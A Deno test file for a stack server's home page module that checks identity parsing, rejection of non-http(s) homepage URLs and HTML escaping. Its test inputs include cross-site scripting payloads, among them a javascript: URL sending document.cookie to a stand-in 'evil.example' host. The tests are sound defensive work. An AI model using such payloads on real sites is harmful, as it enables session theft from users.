import { assertEquals, assertStringIncludes } from "@std/assert";
import { homePageHtml, homePageMd, toStackIdentity } from "./homePage.ts";

const toContext = (denoConfig: unknown) => ({
  identity: toStackIdentity(denoConfig),
  generators: ["@skmtc/gen-zod"],
  origin: "https://stack.example",
});

Deno.test("toStackIdentity - reads the label, version and derived hub link", () => {
  assertEquals(
    toStackIdentity({
      name: "@skmtc/markdown-docs",
      version: "1.2.3",
      description: "Docs from a schema.",
    }),
    {
      name: "skmtc/markdown-docs",
      version: "1.2.3",
      description: "Docs from a schema.",
      homepageUrl: "https://skmtc.dev/skmtc/markdown-docs",
    },
  );
});

Deno.test("toStackIdentity - keeps an http(s) homepage", () => {
  const identity = toStackIdentity({
    name: "@skmtc/markdown-docs",
    homepage: "https://docs.example/stack",
  });
  assertEquals(identity.homepageUrl, "https://docs.example/stack");
});

Deno.test("toStackIdentity - drops a homepage that is not http(s)", () => {
  // The value comes from a third party's `deno.json` and lands in `href`
  // attributes, where a `javascript:` URL would run on the deployment's
  // own origin. Escaping alone does not neutralize the scheme.
  const identity = toStackIdentity({
    name: "@evil/stack",
    homepage: "javascript:fetch('https://evil.example/'+document.cookie)",
  });
  assertEquals(identity.homepageUrl, "https://skmtc.dev/evil/stack");
});

Deno.test("homePageHtml - a rejected homepage never reaches an href", () => {
  const html = homePageHtml(toContext({
    name: "@evil/stack",
    homepage: "javascript:alert(1)",
  }));
  assertEquals(html.includes("javascript:"), false);
});

Deno.test("homePageHtml - escapes identity text into the page", () => {
  const html = homePageHtml(toContext({
    name: "@evil/stack",
    description: '<script>alert("x")</script>',
  }));
  assertEquals(html.includes("<script>alert"), false);
  assertStringIncludes(html, "&lt;script&gt;alert(&quot;x&quot;)");
});

Deno.test("toStackIdentity - an unreadable config yields the generic page", () => {
  assertEquals(toStackIdentity("not a config"), {});
  assertStringIncludes(
    homePageMd(toContext("not a config")),
    "# skmtc stack server",
  );
});

Deno.test("homePageMd - names the stack, its generators and the endpoints", () => {
  const markdown = homePageMd(toContext({
    name: "@skmtc/markdown-docs",
    version: "1.2.3",
  }));
  assertStringIncludes(markdown, "# skmtc/markdown-docs v1.2.3");
  assertStringIncludes(markdown, "- @skmtc/gen-zod");
  assertStringIncludes(markdown, "`POST /artifacts`");
  assertStringIncludes(markdown, "https://stack.example/artifacts");
});
